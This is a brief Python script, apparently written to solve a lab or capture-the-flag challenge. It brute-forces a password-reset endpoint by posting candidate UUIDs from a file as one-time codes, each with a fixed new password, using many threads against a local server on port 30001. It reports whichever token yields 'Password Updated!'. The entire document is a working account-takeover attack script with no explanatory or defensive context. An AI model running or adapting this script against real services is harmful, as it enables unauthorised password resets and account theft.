import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import multiprocessing

uuids = open("uuids.txt", "r").read().splitlines()

def change_password(uuid):
    payload = {
        "otp": uuid,
        "password": "godsword"
    }
    response = requests.post(
        "http://localhost:30001/change-password", data=payload)
    if "Password Updated!" in response.text:
        print(f"Success: {uuid}")
        return uuid
    else:
        return None


def process_uuids(uuids):
    num_cores = multiprocessing.cpu_count()
    max_workers = num_cores * 5  
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(change_password, uuid): uuid for uuid in uuids}

        for future in as_completed(futures):
            uuid = futures[future]
            try:
                result = future.result()
                # if result:
                #     sys.exit(0)
            except Exception as exc:
                print(f"UUID {uuid} generated an exception: {exc}")


process_uuids(uuids)
